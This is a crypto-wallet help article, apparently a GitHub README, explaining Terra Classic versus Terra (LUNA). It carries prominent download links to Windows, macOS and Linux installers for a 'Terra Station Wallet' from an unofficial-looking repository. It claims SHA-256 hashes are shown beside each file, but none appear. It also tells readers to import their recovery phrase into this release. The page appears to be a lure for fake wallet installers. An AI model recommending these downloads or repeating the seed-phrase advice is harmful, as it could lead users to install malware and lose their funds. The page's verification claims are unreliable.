![Terra Station Wallet](assets/banner-article.png)

# Terra Classic vs Terra (LUNA): Which Chain Is Your Wallet On

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

Terra Classic and Terra are two separate networks that came out of the May 2022 collapse. Terra Classic kept the original chain, with LUNC and USTC as the renamed tokens; Terra is the new chain that launched afterwards, with LUNA as its token. They are separate networks with separate balances, and the network a wallet is pointed at is what decides which of them you are looking at.

## The two chains side by side

| | Terra Classic | Terra |
|---|---|---|
| Token | LUNC, plus USTC for the legacy stablecoin | LUNA |
| Origin | The original chain, continued | New chain launched after the collapse |
| Legacy balances | Appear automatically on the same addresses | Not present - nothing migrated by default |
| Wallet in this pack | Terra Station Wallet | Not documented here |

The naming is the source of most confusion: "Terra" now refers to the new chain, while the old chain is "Terra Classic". Documentation written before 2022 uses "Terra" for what is now Terra Classic, which is why older guides describe staking and balances that look like they should apply to both.

## What happened to balances in 2022

The collapse ended the original chain's stablecoin peg and led to a new chain being launched. On Terra Classic, the original chain continued with renamed tokens: LUNA became LUNC, and UST became USTC. Holders did not need to claim anything for that rename - the balances stayed at the same addresses and simply carried new names.

The new chain's distribution was defined by a snapshot at the fork rather than by a conversion of existing holdings, and the community threads that discuss it describe a vesting period that ran for roughly two years, ending in late 2024. That is the shape of an airdrop with a schedule, not a swap desk. That is why a wallet holding LUNC shows nothing on Terra, and a wallet holding LUNA shows nothing on Terra Classic: they are different networks with different balances, and neither one is "the same funds, moved".

## Which one does this wallet work with

Terra Station Wallet is the wallet this pack documents, and it works with Terra Classic: LUNC and USTC balances, staking, governance and sending. It is not a bridge and does not convert LUNC into LUNA.

One check available inside the app itself: the token list names what is held, so a wallet showing LUNA is reading the other network, while one showing LUNC or USTC is reading Terra Classic.

If your funds are on the other chain, that is a different wallet and a different question. If you are not sure which chain your balance is on, the fastest answer is an explorer lookup with the address, not a guess from the app.

https://github.com/terraclassic-wallet/lunc-wallet-recovery/blob/main/move-lunc-to-luna-2-0.md covers what the wallet does, and https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-account-not-loading.md covers the case where the balance simply never appears - which is often a network-setting problem rather than a missing balance.

## How to tell which chain an article means

Because the names changed in 2022, the date of a piece of writing is a reliable clue. Anything published before May 2022 that says "Terra" is describing Terra Classic - its token, its staking, its wallet. Anything after that is usually explicit, because the two chains made the ambiguity unavoidable.

The practical rule: read the token name before the chain name. A guide about LUNC or USTC is about Terra Classic whatever else it says. A guide about LUNA after mid-2022 is about the other chain, even where the interface looks familiar. *Using a Terra Classic Explorer* settles it definitively for a specific address.

## Practical consequences of getting it wrong

- **An empty account on the right address** is the usual symptom of pointing at the wrong network. Nothing is lost; the network setting is wrong.
- **A send aimed at the wrong network** is not recoverable by the wallet. Before sending, confirm that the recipient's address and network match your own - this is the single most expensive mistake in this space.
- **Staking rewards do not exist across chains.** A delegation on Terra Classic has nothing to do with Terra, and vice versa.
- **Documentation and help articles mix the names.** When a guide says "Terra", check its date: before mid-2022 it almost certainly means Terra Classic.

## A short checklist before you act

1. Identify your token: LUNC or USTC means Terra Classic; LUNA means the other chain.
2. Check the network setting in the wallet before reading any balance as final.
3. Verify the address in an explorer on the network you believe you are using.
4. When sending, confirm the recipient is on the same network as the sender - not just that the address looks right.
5. If a guide you are following predates mid-2022, treat its network names as historical rather than as a statement about the wallet you have open.

## Questions people ask

### Can I convert LUNC to LUNA in the wallet?

No. They are separate chains, and the wallet does not bridge between them. Converting means using an exchange or a bridge, which is outside the wallet's scope.

### How do I tell which chain a wallet is reading?

By the token it lists and the network it is set to. The pack establishes Terra Classic's own address format and nothing about any other, so look the address up in an explorer on the network you expect and compare what comes back.

### Are my old balances still there after 2022?

On Terra Classic, yes: the chain continued and balances were renamed, not moved. Importing the phrase into the current release shows them.

### Do I need a different wallet for LUNA?

Yes, a wallet that supports the other chain. This wallet's scope is Terra Classic, which is what *Where to Download Terra Station Wallet* installs.

If you take one thing from this page, take the sending rule: the recipient's network and yours must match, and the only person who can confirm that is the recipient. https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/lunc-address-and-chain-id.md covers the checks in the order worth doing them.
